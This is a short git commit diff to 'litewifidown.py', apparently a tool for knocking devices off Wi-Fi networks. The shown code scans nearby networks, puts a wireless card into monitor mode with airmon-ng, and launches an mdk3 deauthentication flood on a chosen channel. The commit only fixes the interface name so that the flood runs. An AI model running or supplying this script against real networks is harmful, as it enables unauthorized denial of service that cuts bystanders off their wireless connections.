2539699d8458912ad29a41625ffb1f2ca04a02fa
Alan Ramalho <ramalho.sit@gmail.com>
2018-11-20 01:45:12 -0200

    Update litewifidown.py

--- litewifidown.py
+++ litewifidown.py
@@ -62,7 +62,7 @@ print("")
 if way == 1:
   os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan0 | awk '{print FS2 $7}' | sed '/$choose/p; d' > targ")
   os.system('card=`cat card.sh` && ch=`cat chan` && airmon-ng start $card $ch')
-  os.system('card=`cat card.sh` && choose=`cat choose` && ch=`cat chan` && mdk3 $card d -c $ch')
+  os.system('card=`cat card.sh`mon && choose=`cat choose` && ch=`cat chan` && mdk3 $card d -c $ch')
   print("Wait..")
   os.system('card=`cat card.sh`mon && ch=`cat chan` && airmon-ng stop $card')
 else:
